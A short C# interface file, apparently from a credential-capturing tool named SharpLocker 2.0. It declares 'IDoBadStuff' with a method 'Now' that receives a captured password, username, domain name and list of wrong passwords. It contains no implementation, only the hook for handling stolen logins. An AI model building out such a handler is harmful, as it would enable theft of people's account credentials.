using System.Collections.Generic;

namespace SharpLocker_2._0.Interfaces
{
    public interface IDoBadStuff
    {
        void Now(string password, string username, string domainName, List<string> wrongPasswords);
    }
}
